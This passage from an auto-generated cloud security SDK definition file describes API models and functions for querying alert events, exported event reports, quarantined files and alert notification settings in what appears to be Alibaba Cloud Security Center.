  canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online processing of exceptions is supported, such as blocking an exception, adding an exception to the whitelist, and ignoring an exception. Valid values:

*   **true**: The online processing of exceptions is supported.
*   **false**: The online processing of exceptions is not supported.', example='true'),
  dataSource?: string(name='DataSource', description='The data source of the exception.', example='aegis_suspicious_****'),
  details?: [ 
    {
      nameDisplay?: string(name='NameDisplay', description='The display name of the alert event.', example='Trojan Path'),
      type?: string(name='Type', description='The format in which the details of the exception are displayed.

Valid values:

*   **text**
*   **html**', example='html'),
      value?: string(name='Value', description='The attribute information about the exception. For example, if the exception is associated with an alert that is triggered by an unusual logon, the information can include the time when the logon is initiated and the location from which the logon is initiated. If the exception is associated with an alert that is triggered by a webshell file, the information can include the path of the trojan file and the type of the trojan.', example='getopt'),
    }
  ](name='Details', description='An array that consists of the details of the exception.'),
  eventDesc?: string(name='EventDesc', description='The description of the exception.', example='The detection model found a suspicious Webshell file on your server, which may be a backdoor file implanted to maintain permissions after the attacker successfully invaded the website.'),
  eventName?: string(name='EventName', description='The name of the exception.', example='WEBSHELL'),
  eventStatus?: string(name='EventStatus', description='The status of the exception. Valid values:

*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired', example='1'),
  eventTypeDesc?: string(name='EventTypeDesc', description='The type of the exception.', example='Malicious Software-Variable Trojan'),
  id?: int32(name='Id', description='The ID of the exception.', example='11416624'),
  instanceName?: string(name='InstanceName', description='The name of the server on which the exception was detected.', example='ca_cpm_****'),
  internetIp?: string(name='InternetIp', description='The public IP address of the server on which the exception was detected.', example='101.132.XX.XX'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the exception was detected.', example='172.26.XX.XX'),
  lastTime?: string(name='LastTime', description='The time when the exception was last detected.', example='2018-10-30 11:43:46'),
  level?: string(name='Level', description='The risk level of the exception. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  operateErrorCode?: string(name='OperateErrorCode', description='The code that indicates the handling result of the exception.', example='quara.Succes'),
  operateMsg?: string(name='OperateMsg', description='The message that indicates the handling result of the exception.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the exception can be detected. Valid values:

*   **0**: Basic edition
*   **1**: Advanced edition
*   **2**: Enterprise edition', example='1'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the exception was detected.', example='bffb12c3-590a-4db2-b538-****'),
}

model DescribeSuspEventDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSuspEventDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of an exception. An alert event consists of an alert and exceptions. Each alert event is associated with multiple exceptions.
 *
 * @param request DescribeSuspEventDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSuspEventDetailResponse
 */
async function describeSuspEventDetailWithOptions(request: DescribeSuspEventDetailRequest, runtime: Util.RuntimeOptions): DescribeSuspEventDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.suspiciousEventId)) {
    query['SuspiciousEventId'] = request.suspiciousEventId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of an exception. An alert event consists of an alert and exceptions. Each alert event is associated with multiple exceptions.
 *
 * @param request DescribeSuspEventDetailRequest
 * @return DescribeSuspEventDetailResponse
 */
async function describeSuspEventDetail(request: DescribeSuspEventDetailRequest): DescribeSuspEventDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventDetailWithOptions(request, runtime);
}

model DescribeSuspEventExportInfoRequest {
  exportId?: int32(name='ExportId', description='The ID of the export task.

> You can call the [ExportSuspEvents](~~ExportSuspEvents~~) operation to query the ID.', example='123'),
}

model DescribeSuspEventExportInfoResponseBody = {
  exportStatus?: string(name='ExportStatus', description='The handling status for the exception. Valid values:

*   **exporting**: in progress
*   **success**: successful
*   **failed**: failed
*   **pending**: pending', example='success'),
  fileName?: string(name='FileName', description='The name of the exported file.', example='suspicious_event_20221221_1671590521234.zip'),
  gmtCreate?: long(name='GmtCreate', description='The time when the export task was created.', example='2022-12-20T15:18Z'),
  gmtModified?: long(name='GmtModified', description='The time when the export task was modified.', example='2022-12-20T15:18Z'),
  id?: int32(name='Id', description='The ID of the export task.', example='11'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://suspicious-xxxxxxx.oss-cn-shanghai.aliyuncs.com/xxxxxxxxxxx/suspicious_event_20221221_1671590525269.zip?Expires=1671594125&OSSAccessKeyId=LTAIxxxxxxxxxxxxxx&Signature=xxxxxxxxxxxxxxxxxx'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
  properties?: string(name='Properties', description='The exported parameters of exceptions.', example='id,eventSubType,eventDetail,level,status,ip,instanceName,desc,lastTime,operateTime,note'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='BE120DAB-F4E7-4C53-ADC3-A97578AXXXXX'),
  totalCount?: int32(name='TotalCount', description='The total number of exceptions exported.', example='1'),
  type?: string(name='Type', description='The type of the export task. The value is fixed as suspiciousEvent.', example='suspiciousEvent'),
}

model DescribeSuspEventExportInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSuspEventExportInfoResponseBody(name='body'),
}

/**
 * @summary Queries the information about an export task of exceptions.
 *
 * @param request DescribeSuspEventExportInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSuspEventExportInfoResponse
 */
async function describeSuspEventExportInfoWithOptions(request: DescribeSuspEventExportInfoRequest, runtime: Util.RuntimeOptions): DescribeSuspEventExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about an export task of exceptions.
 *
 * @param request DescribeSuspEventExportInfoRequest
 * @return DescribeSuspEventExportInfoResponse
 */
async function describeSuspEventExportInfo(request: DescribeSuspEventExportInfoRequest): DescribeSuspEventExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventExportInfoWithOptions(request, runtime);
}

model DescribeSuspEventQuaraFilesRequest {
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='10541428', deprecated=true),
  groupingId?: long(name='GroupingId', description='The ID of the server group to which the server belongs. The quarantined file is located on the server.', example='11472451'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page.', example='20'),
  quaraTag?: string(name='QuaraTag', description='The unique ID of the quarantined file.', example='a31337789f64d39b2219733ec99f9af7'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.82.XX.XX'),
  status?: string(name='Status', description='The status of the quarantined file that you want to query. Valid values:

*   **quaraFailed**: The file fails to be quarantined.
*   **quaraDone**: The file is quarantined.
*   **quaraing**: The file is being quarantined.
*   **rollbackFailed**: The system fails to cancel quarantining the file.
*   **rollbackDone**: The system cancelled quarantining the file.
*   **rollbacking**: The system is cancelling quarantining the file.', example='quaraDone'),
}

model DescribeSuspEventQuaraFilesResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='7'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  quaraFiles?: [ 
    {
      eventName?: string(name='EventName', description='The name of the event.', example='WEBSHELL'),
      eventType?: string(name='EventType', description='The type of the event.', example='WebshellQuaraEventType'),
      id?: int32(name='Id', description='The ID of the quarantined file.', example='26918'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-2ze9t1qp36n1436m****'),
      instanceName?: string(name='InstanceName', description='The name of the server on which the quarantined file is located.', example='iZwz98dkiw3vbrtqrt5v****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server on which the quarantined file is located.', example='47.XX.XX.131'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the quarantined file is located.', example='172.16.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the server on which the quarantined file is located.', example='47.XX.XX.131'),
      link?: string(name='Link', description='The download link of the quarantined file.', example='https://xxx.xxx/xxx'),
      md5?: string(name='Md5', description='The MD5 hash value of the quarantined file.', example='5ddebe926acc7ed39a664409bfd0ec10'),
      modifyTime?: string(name='ModifyTime', description='The time when the quarantined file was last modified.', example='2020-06-11 20:37:08'),
      path?: string(name='Path', description='The path to the quarantined file on the server.', example='/var/www/html/webshell-sample-master/others/defc3e21bab59e2a2ab49f7eda99f65f83d4d349.jpg'),
      status?: string(name='Status', description='The status of the quarantined file. Valid values:

*   **quaraFailed**: The file fails to be quarantined.
*   **quaraDone**: The file is quarantined.
*   **quaraing**: The file is being quarantined.
*   **rollbackFailed**: The system fails to cancel quarantining the file.
*   **rollbackDone**: The system cancelled quarantining the file.
*   **rollbacking**: The system is cancelling quarantining the file.', example='rollbackDone'),
      tag?: string(name='Tag', description='The unique ID of the event.', example='228f890e56eae9eec6a42c7ea801b538'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='04a0e735-ad32-4835-b635-0458d77b****'),
    }
  ](name='QuaraFiles', description='An array that consists of the quarantined files.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='32A73759-4C0F-4801-BE98-901223ACEE9A'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='38'),
}

model DescribeSuspEventQuaraFilesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSuspEventQuaraFilesResponseBody(name='body'),
}

/**
 * @summary Queries quarantined files by page.
 *
 * @param request DescribeSuspEventQuaraFilesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSuspEventQuaraFilesResponse
 */
async function describeSuspEventQuaraFilesWithOptions(request: DescribeSuspEventQuaraFilesRequest, runtime: Util.RuntimeOptions): DescribeSuspEventQuaraFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.groupingId)) {
    query['GroupingId'] = request.groupingId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.quaraTag)) {
    query['QuaraTag'] = request.quaraTag;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventQuaraFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries quarantined files by page.
 *
 * @param request DescribeSuspEventQuaraFilesRequest
 * @return DescribeSuspEventQuaraFilesResponse
 */
async function describeSuspEventQuaraFiles(request: DescribeSuspEventQuaraFilesRequest): DescribeSuspEventQuaraFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventQuaraFilesWithOptions(request, runtime);
}

model DescribeSuspEventUserSettingRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  id?: int32(name='Id', description='The ID. You do not need to specify this parameter.', example='123'),
  sourceIp?: string(name='SourceIp', description='The IP address of the request. You do not need to specify this parameter.', example='127.0.XX.XX'),
}

model DescribeSuspEventUserSettingResponseBody = {
  levelsOn?: [ string ](name='LevelsOn', description='An array that consists of the risk levels of alert notifications. Valid values:

*   **remind**
*   **suspicious**
*   **serious**'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='028CF634-5268-5660-9575-48C9ED6XXXXX'),
}

model DescribeSuspEventUserSettingResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSuspEventUserSettingResponseBody(name='body'),
}

/**
 * @summary Queries the user settings for exceptions.
 *
 * @param request DescribeSuspEventUserSettingRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSuspEventUserSettingResponse
 */
async function describeSuspEventUserSettingWithOptions(request: DescribeSuspEventUserSettingRequest, runtime: Util.RuntimeOptions): DescribeSuspEventUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the user settings for exceptions.
 *
 * @param request DescribeSuspEventUserSettingRequest
 * @return DescribeSuspEventUserSettingResponse
 */
async function describeSuspEventUserSetting(request: DescribeSuspEventUserSettingRequest): DescribeSuspEventUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventUserSettingWithOptions(request, runtime);
}

model DescribeSuspEventsRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The ID of the alert event.

> To query the details of an alert event, you must specify the ID of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the IDs of alert events.', example='8df914418f4211fb****'),
  assetsTypeList?: [ string ](name='AssetsTypeList', description='The types of the assets.'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster of whose alert events you want to query.', example='c4af4fdf38a98496a9b63c2be5dae****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='instanceId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers.', example='ccf9769c22b844ff9b8d57417683b****'),
  currentPage?: string(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the alert event is handled. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='N'),
  eventNames?: string(name='EventNames', description='The subtype of the alert event. Separate multiple subtypes with commas (,).', example='WEBSHELL'),
  from?: string(name='From', description='The data source of the alert event. Set the value to sas.', example='sas'),
  groupId?: long(name='GroupId', description='The ID of the asset group to which the affected asset belongs.', example='18768'),
  id?: long(name='Id', description='The ID of the alert event.', example='123'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the alert event. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  multiAccountActionType?: int32(name='MultiAccountActionType', description='The type of the accounts that you want to query. Default value: **0**. Valid values:

*   **0**: the current account.
*   **1**: all accounts.', example='0'),
  name?: string(name='Name', description='The name of the asset that is affected by the alert event.', example='ecs-xxx'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList', description='An array that consists of the handling result codes of alert events.'),
  operateTimeEnd?: string(name='OperateTimeEnd', description='The timestamp when the handling operation ends.', example='2022-07-06 13:50:38'),
  operateTimeStart?: string(name='OperateTimeStart', description='The timestamp when the handling operation starts.', example='2022-07-05 13:50:38'),
  pageSize?: string(name='PageSize', description='The number of entries per page. Default value: **20**. Maximum value: 100.', example='20'),
  parentEventTypes?: string(name='ParentEventTypes', description='The alert type of the alert event. Valid values:

*   **Suspicious process**
*   **Webshell**
*   **Unusual logon**
*   **Exception**
*   **Sensitive file tampering**
*   **Malicious process (cloud threat detection)**
*   **Suspicious network connection**
*   **Suspicious account**
*   **Application intrusion event**
*   **Cloud threat detection**
*   **Precise defense**
*   **Application whitelist**
*   **Persistent webshell**
*   **Web application threat detection**
*   **Malicious script**
*   **Threat intelligence**
*   **Malicious network activity**
*   **Cluster exception**
*   **Webshell (on-premises threat detection)**
*   **Vulnerability exploitation**
*   **Malicious process (on-premises threat detection)**
*   **Trusted exception**
*   **Others**', example='Webshell'),
  remark?: string(name='Remark', description='The name of the alert or the information about the asset.

>  Fuzzy search is supported. The asset information includes the name, public IP address, and private IP address of an asset.', example='192.168.XX.XX'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the ID.', example='16670360956*****'),
  sortColumn?: string(name='SortColumn', description='The custom sorting field. Default value: **operateTime**. Valid values:

*   **lastTime**: the latest occurrence time.
*   **operateTime**: the handling time.

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='operateTime'),
  sortType?: string(name='SortType', description='The custom sorting order. Default value: **desc**. Valid values:

*   **asc**: the ascending order
*   **desc**: the descending order

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='desc'),
  source?: string(name='Source', description='The source of the alert.', example='aegis_suspicious_file_v2'),
  sourceAliUids?: [ long ](name='SourceAliUids', description='The IDs of the Alibaba Cloud accounts within which alerts are generated.'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  status?: string(name='Status', description='The status of the alert event. Valid values:

*   **0**: all
*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired
*   **128**: deleted
*   **512**: automatically blocking
*   **513**: automatically blocked', example='1'),
  strictMode?: string(name='StrictMode', description='Specifies whether to enable the strict alerting mode.

*   N: no
*   Y: Yes', example='Y'),
  tacticId?: string(name='TacticId', description='The tactic ID of ATT\\\\&CK.', example='TA0001'),
  targetType?: string(name='TargetType', description='The item that is used to search for the container. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the server
*   **imageUuid**: the UUID of the image', example='containerId'),
  timeEnd?: string(name='TimeEnd', description='The end time when the alert event was last detected.', example='2022-07-06 13:50:38'),
  timeStart?: string(name='TimeStart', description='The start time when the alert event was last detected.', example='2022-07-05 13:50:38'),
  uniqueInfo?: string(name='UniqueInfo', description='The unique key of the alert.', example='73fc06fb175a7405697e402f52864****'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the alert is detected. Separate multiple UUIDs with commas (,).', example='bb5d2484-f10e-450d-8917-3e79667e****,0e7c2fcd-7100-42c7-a21a-db6e4f32****'),
}

model DescribeSuspEventsShrinkRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The ID of the alert event.

> To query the details of an alert event, you must specify the ID of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the IDs of alert events.', example='8df914418f4211fb****'),
  assetsTypeList?: [ string ](name='AssetsTypeList', description='The types of the assets.'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster of whose alert events you want to query.', example='c4af4fdf38a98496a9b63c2be5dae****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='instanceId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers.', example='ccf9769c22b844ff9b8d57417683b****'),
  currentPage?: string(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the alert event is handled. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='N'),
  eventNames?: string(name='EventNames', description='The subtype of the alert event. Separate multiple subtypes with commas (,).', example='WEBSHELL'),
  from?: string(name='From', description='The data source of the alert event. Set the value to sas.', example='sas'),
  groupId?: long(name='GroupId', description='The ID of the asset group to which the affected asset belongs.', example='18768'),
  id?: long(name='Id', description='The ID of the alert event.', example='123'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the alert event. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  multiAccountActionType?: int32(name='MultiAccountActionType', description='The type of the accounts that you want to query. Default value: **0**. Valid values:

*   **0**: the current account.
*   **1**: all accounts.', example='0'),
  name?: string(name='Name', description='The name of the asset that is affected by the alert event.', example='ecs-xxx'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList', description='An array that consists of the handling result codes of alert events.'),
  operateTimeEnd?: string(name='OperateTimeEnd', description='The timestamp when the handling operation ends.', example='2022-07-06 13:50:38'),
  operateTimeStart?: string(name='OperateTimeStart', description='The timestamp when the handling operation starts.', example='2022-07-05 13:50:38'),
  pageSize?: string(name='PageSize', description='The number of entries per page. Default value: **20**. Maximum value: 100.', example='20'),
  parentEventTypes?: string(name='ParentEventTypes', description='The alert type of the alert event. Valid values:

*   **Suspicious process**
*   **Webshell**
*   **Unusual logon**
*   **Exception**
*   **Sensitive file tampering**
*   **Malicious process (cloud threat detection)**
*   **Suspicious network connection**
*   **Suspicious account**
*   **Application intrusion event**
*   **Cloud threat detection**
*   **Precise defense**
*   **Application whitelist**
*   **Persistent webshell**
*   **Web application threat detection**
*   **Malicious script**
*   **Threat intelligence**
*   **Malicious network activity**
*   **Cluster exception**
*   **Webshell (on-premises threat detection)**
*   **Vulnerability exploitation**
*   **Malicious process (on-premises threat detection)**
*   **Trusted exception**
*   **Others**', example='Webshell'),
  remark?: string(name='Remark', description='The name of the alert or the information about the asset.

>  Fuzzy search is supported. The asset information includes the name, public IP address, and private IP address of an asset.', example='192.168.XX.XX'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the ID.', example='16670360956*****'),
  sortColumn?: string(name='SortColumn', description='The custom sorting field. Default value: **operateTime**. Valid values:

*   **lastTime**: the latest occurrence time.
*   **operateTime**: the handling time.

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='operateTime'),
  sortType?: string(name='SortType', description='The custom sorting order. Default value: **desc**. Valid values:

*   **asc**: the ascending order
*   **desc**: the descending order

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='desc'),
  source?: string(name='Source', description='The source of the alert.', example='aegis_suspicious_file_v2'),
  sourceAliUidsShrink?: string(name='SourceAliUids', description='The IDs of the Alibaba Cloud accounts within which alerts are generated.'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  status?: string(name='Status', description='The status of the alert event. Valid values:

*   **0**: all
*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired
*   **128**: deleted
*   **512**: automatically blocking
*   **513**: automatically blocked', example='1'),
  strictMode?: string(name='StrictMode', description='Specifies whether to enable the strict alerting mode.

*   N: no
*   Y: Yes', example='Y'),
  tacticId?: string(name='TacticId', description='The tactic ID of ATT\\\\&CK.', example='TA0001'),
  targetType?: string(name='TargetType', description='The item that is used to search for the container. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the server
*   **imageUuid**: the UUID of the image', example='containerId'),
  timeEnd?: string(name='TimeEnd', description='The end time when the alert event was last detected.', example='2022-07-06 13:50:38'),
  timeStart?: string(name='TimeStart', description='The start time when the alert event was last detected.', example='2022-07-05 13:50:38'),
  uniqueInfo?: string(name='UniqueInfo', description='The unique key of the alert.', example='73fc06fb175a7405697e402f52864****'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the alert is detected. Separate multiple UUIDs with commas (,).', example='bb5d2484-f10e-450d-8917-3e79667e****,0e7c2fcd-7100-42c7-a21a-db6e4f32****'),
}

model DescribeSuspEventsResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0D6E20E4-8326-1D03-A553-2182BE9E82F9'),
  suspEvents?: [ 
    {
      advanced?: boolean(name='Advanced', description='Indicates whether the alert event was analyzed offline.', example='true'),
      alarmEventName?: string(name='AlarmEventName', description='The name of the alert event.', example='login_common_location'),
      alarmEventNameDisplay?: string(name='AlarmEventNameDisplay', description='The name of the alert.', example='Login with unusual location'),
      alarmEventType?: string(name='AlarmEventType', description='The type of the alert event.', example='Unusual Logon'),
      alarmEventTypeDisplay?: string(name='AlarmEventTypeDisplay', description='The display name of the type of the alert event.', example='Unusual Logon'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.', example='8df914418f****'),
      appName?: string(name='AppName', description='The name of the application to which the alert event belongs.', example='pro-deploy-tibasic'),
      autoBreaking?: boolean(name='AutoBreaking', description='Indicates whether automatic defense is enabled.', example='true'),
      canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether you can handle the alert event online, such as quarantining the source file of the malicious process. Valid values:

*   **true**
*   **false**', example='true'),
      canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**
*   **false**', example='false'),
      containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the safeguard mode for major activities is enabled for the server. Valid values:

*   **true**
*   **false**', example='false'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='container_1648601865161_14925_02_000****'),
      containerImageId?: string(name='ContainerImageId', description='The ID of the container image.', example='sha256:2e5a3b0ae5f452b3cb458789a9a7542ef40035a84318469a8528c5e444db1****'),
      containerImageName?: string(name='ContainerImageName', description='The name of the container image.', example='centos7_apache:v1.0.1'),
      dataSource?: string(name='DataSource', description='The source of data. This parameter can be ignored.', example='aegis_suspicious_****'),
      desc?: string(name='Desc', description='The impact of the alert event.', example='webshell'),
      details?: [ 
        {
          nameDisplay?: string(name='NameDisplay', description='The display name of the alert event.', example='Login with unusual location'),
          type?: string(name='Type', description='The type of the alert event.', example='text'),
          value?: string(name='Value', description='The path of the alert event.', example='/etc/crontab'),
          valueDisplay?: string(name='ValueDisplay', description='The display name of the path of the alert event.', example='/etc/crontab'),
        }
      ](name='Details', description='The details of the alert event.'),
      displaySandboxResult?: boolean(name='DisplaySandboxResult', description='Indicates whether the alert event can be detected by cloud sandbox. Valid values:

*   **true**
*   **false**', example='true'),
      eventNotes?: [ 
        {
          note?: string(name='Note', description='The note.', example='Test'),
          noteId?: long(name='NoteId', description='The ID of the note.', example='123'),
          noteTime?: string(name='NoteTime', description='The time when the note was created.', example='2018-09-26 01:51:01'),
        }
      ](name='EventNotes', description='The note information about the alert event.'),
      eventStatus?: int32(name='EventStatus', description='The status of the alert event. Valid values:

*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
